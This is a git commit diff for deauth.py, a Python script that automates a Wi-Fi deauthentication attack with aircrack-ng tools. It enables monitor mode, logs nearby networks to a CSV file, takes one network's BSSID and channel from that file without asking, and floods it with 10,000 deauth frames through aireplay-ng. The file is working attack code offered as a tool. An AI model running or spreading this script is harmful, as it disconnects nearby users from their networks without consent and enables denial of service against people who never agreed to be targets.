f48d813e2f1bd2abcc7bedd87900f0fdf971d9f2
Aitor <aitoribarra@tutanota.com>
2020-08-21 15:30:44 +0200

    update deauth.py output reader implemented one attack automatized

--- deauth.py
+++ deauth.py
@@ -2,28 +2,44 @@ from os import system
 
 # Check interface
 system("ifconfig")
+try:
+    # Enable monitor mode
+    system("sudo airmon-ng check kill")
 
-# Enable monitor mode
-system("sudo airmon-ng check kill")
+    interface = input("Enter your interface(ex: wlan0): ")
+    monitor_mode = "airmon-ng start {}".format(interface)
+    system(monitor_mode)
 
-interface = input("Enter your interface(ex: wlan0): ")
-monito_mode = "airmon-ng start {}".format(interface)
-system(monito_mode)
+    # Find networks
+    find_networks = "sudo airodump-ng -w myoutput --output-format csv {}mon".format(interface)
+    system(find_networks)
 
-# Find networks
-find_networks = "sudo airodump-ng {}mon".format(interface)
-system(find_networks)
+    # Select targets
+    output = open("myoutput-01.csv", "r")
 
-# Select targets
-targets = input("Enter targets BSSID separated by , : ")
-targets = targets.split(",")
+    target_list = []
 
-# Attack
+    for i in range(20):
+        line = output.readline()
+        target_list.append(line.split(","))
+    
+    system("rm myoutput-01.csv")
+
+    # Attack
+    channel = target_list[2][3]
+    bssid = target_list[2][0]
+
+    system("airodump-ng --channel {} {}mon".format(channel,interface))
+    system("aireplay-ng --deauth 10000 -a {} {}mon".format(bssid,interface))
 
 
 
-# Desable monitor mode
-disable_mon_mode = "sudo airmon-ng stop {}mon".format(interface)
-system(disable_mon_mode)
+finally:    
+
+    # Desable monitor mode (finally)
+    disable_mon_mode = "sudo airmon-ng stop {}mon".format(interface)
+    system(disable_mon_mode)
+    system("sudo service network-manager restart")
+    
 
 #system("sudo aircrack-ng")
